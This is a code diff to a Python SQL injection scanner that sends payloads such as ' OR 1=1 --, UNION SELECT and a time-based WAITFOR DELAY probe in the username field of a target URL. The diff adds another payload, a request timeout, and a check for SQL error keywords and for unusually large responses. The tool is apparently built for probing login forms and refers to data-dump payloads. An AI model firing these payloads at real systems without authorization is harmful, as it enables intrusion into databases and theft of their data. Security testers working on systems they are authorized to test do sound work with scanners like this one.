@@ -4,6 +4,7 @@ from urllib.parse import urljoin
 import argparse
 import datetime
 from colorama import Fore, Style, init
+import re
 
 # Initialize colorama
 init(autoreset=True)
@@ -13,6 +14,7 @@ payloads = [
     "' OR 1=1 --",  # Basic SQLi payload
     "' UNION SELECT NULL, NULL, NULL --",  # Union-based SQLi
     "' WAITFOR DELAY '0:0:5' --",  # Time-based Blind SQLi
+    "' AND 1=1 --",  # Another basic payload
 ]
 
 # Data dump payloads
@@ -31,11 +33,18 @@ def print_log(message, color=Fore.YELLOW):
 # Function to detect SQLi vulnerabilities
 def detect_sqli(url, payload, headers):
     try:
-        response = requests.get(url, headers=headers, params={"username": payload, "password": "anything"})
+        response = requests.get(url, headers=headers, params={"username": payload, "password": "anything"}, timeout=10)
         
-        if "error" in response.text.lower() or "username" in response.text.lower():
-            print_log(f"SQLi vulnerability detected with payload: {payload}")
-            return True
+        if response.status_code == 200:
+            # Check for common SQL error keywords in response
+            sql_error_keywords = ["error", "sql", "mysql", "syntax", "database", "unclosed", "unexpected"]
+            if any(keyword in response.text.lower() for keyword in sql_error_keywords):
+                print_log(f"SQLi vulnerability detected with payload: {payload}")
+                return True
+            # Look for unexpected output or change in behavior (e.g., unexpected number of characters or content in the response)
+            if len(response.text) > 1000:  # You can adjust this threshold based on your app's normal size
+                print_log(f"Potential SQLi found: Large response size change with payload: {payload}")
+                return True
         return False
     except requests.RequestException as e:
         print_log(f"Error sending request: {e}", Fore.RED)
